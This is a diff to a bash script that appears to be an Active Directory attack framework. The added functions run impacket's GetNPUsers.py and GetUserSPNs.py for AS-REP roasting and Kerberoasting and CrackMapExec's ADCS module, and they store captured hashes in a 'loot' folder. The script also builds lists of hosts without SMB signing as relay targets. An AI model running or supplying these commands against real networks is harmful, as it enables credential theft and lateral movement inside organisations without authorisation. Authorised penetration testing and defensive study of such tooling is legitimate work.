@@ -186,7 +186,7 @@ function cme_enum_mssql() {
 function gen_targets() {
 	## SMB
 	echo "[*] Generating smb_targets.txt list..."
-	if test ! -f "loot/smb_targets.txt" && test -f "loot/cme_enum_smb.txt"; then
+	if test -f "loot/cme_enum_smb.txt"; then
 		grep -F -- "$domain" loot/cme_enum_smb.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
 		echo -e "[+] smb_targets.txt generated...\n"
 	else
@@ -195,7 +195,7 @@ function gen_targets() {
 
 	## LDAP
 	echo "[*] Generating ldap_targets.txt list..."
-        if test ! -f "loot/ldap_targets.txt" && test -f "loot/cme_enum_ldap.txt"; then
+        if test -f "loot/cme_enum_ldap.txt"; then
                 grep -F -- "$domain" loot/cme_enum_ldap.txt | cut -d " " -f 10 > loot/ldap_targets.txt
                 echo -e "[+] ldap_targets.txt generated...\n"
 	else
@@ -204,7 +204,7 @@ function gen_targets() {
 
 	## MSSQL
 	echo "[*] Generating mssql_targets.txt list..."
-        if test ! -f "loot/mssql_targets.txt" && test -f "loot/cme_enum_mssql.txt"; then
+        if test -f "loot/cme_enum_mssql.txt"; then
                 grep -F -- "$domain" loot/cme_enum_mssql.txt | cut -d " " -f 10 > loot/mssql_targets.txt
                 echo -e "[+] mssql_targets.txt generated...\n"
         else
@@ -387,12 +387,48 @@ function mitm6_ldap_rbcd() {
 
 
 ## AD submodule functions
+## TODO: Test
 function asreproast() {
-        echo "temp"
+        domain_var
+        if [[ -z ${dc} ]]; then
+                ColorRed '[-] ERROR: domain controller not specified.\nWould you like to specify one?\n'
+                ColorGreen '1)' && echo -e " Yes"
+                ColorGreen '2)' && echo -e " Exit"
+                ColorCyan 'Choose an option: '
+                        read a
+                        case $a in
+                                1) var_setter 'dc' ;;
+                                2) return ;;
+                                *) echo -e "Invalid command entered... exiting\n\n";
+                        esac
+                return
+        fi
+        tmux new-window -e "dc=${dc}" -e "domain=${domain}" -e "username=${username}" -e "password=${password}" -n "asreproast"
+        tmux send-keys -t 5head:asreproast 'bash -c "stty -echo;clear;echo -e \"[*] Looking for ASREPRoastable users...\n[*] Output will be saved to loot/asrep.txt\";stty echo"' C-m
+        tmux send-keys -t 5head:asreproast 'source deps/impacket-0.10.0/bin/activate' C-m
+	tmux send-keys -t 5head:asreproast 'GetNPUsers.py -outputfile loot/asrep.txt -ts -request -dc-ip $dc $domain/$user:$password' C-m
 }
 
+## TODO: Test
 function kerberoast() {
-        echo "temp"
+       domain_var
+        if [[ -z ${dc} ]]; then
+                ColorRed '[-] ERROR: domain controller not specified.\nWould you like to specify one?\n'
+                ColorGreen '1)' && echo -e " Yes"
+                ColorGreen '2)' && echo -e " Exit"
+                ColorCyan 'Choose an option: '
+                        read a
+                        case $a in
+                                1) var_setter 'dc' ;;
+                                2) return ;;
+                                *) echo -e "Invalid command entered... exiting\n\n";
+                        esac
+                return
+        fi
+        tmux new-window -e "dc=${dc}" -e "domain=${domain}" -e "username=${username}" -e "password=${password}" -n "kerberoast"
+        tmux send-keys -t 5head:kerberoast 'bash -c "stty -echo;clear;echo -e \"[*] Looking for Kerberoastable users...\n[*] Output will be saved to loot/kerberoast.txt\";stty echo"' C-m
+        tmux send-keys -t 5head:kerberoast 'source deps/impacket-0.10.0/bin/activate' C-m
+        tmux send-keys -t 5head:kerberoast 'GetUserSPNs.py -outputfile loot/kerberoast.txt -dc-ip $dc $domain/$user:$password' C-m
 }
 
 function share_enum() {
@@ -400,7 +436,23 @@ function share_enum() {
 }
 
 function adcs_enum() {
-	echo "temp"
+        domain_var
+        if [[ -z ${dc} ]]; then
+                ColorRed '[-] ERROR: domain controller not specified.\nWould you like to specify one?\n'
+                ColorGreen '1)' && echo -e " Yes"
+                ColorGreen '2)' && echo -e " Exit"
+                ColorCyan 'Choose an option: '
+                        read a
+                        case $a in
+                                1) var_setter 'dc' ;;
+                                2) return ;;
+                                *) echo -e "Invalid command entered... exiting\n\n";
+                        esac
+                return
+        fi
+        tmux new-window -e "dc=${dc}" -e "domain=${domain}" -e "username=${username}" -e "password=${password}" -n "adcs"
+        tmux send-keys -t 5head:adcs 'bash -c "stty -echo;clear;echo -e \"[*] Enumerating ADCS with CrackMapExec...\n\";stty echo"' C-m
+        tmux send-keys -t 5head:adcs 'deps/cme ldap $dc -u $username -p $password -d $domain -M adcs' C-m
 }
 
 function bloodhound_py() {
@@ -564,9 +616,8 @@ $(ColorCyan 'Choose a function:') "
 menu
 
 ## To-do
-# 1. Need a dependenacy checker startup thing
-# 2. need env variable + variable safety checker exeter thing
-# 3. Add checker to ensure 5head.sh is executed from base wd of repo
-# 4. implement ntlmrelayx + mssql (need testing)
-# 5. implement ntlmrelayx multi protocol (need testing)
+# 1. Dependancy checker for mandatory args(?)
+# 2. Add checker to ensure 5head.sh is executed from base wd of repo
+# 3. implement ntlmrelayx + mssql (need testing)
+# 4. implement ntlmrelayx multi protocol (need testing)
 
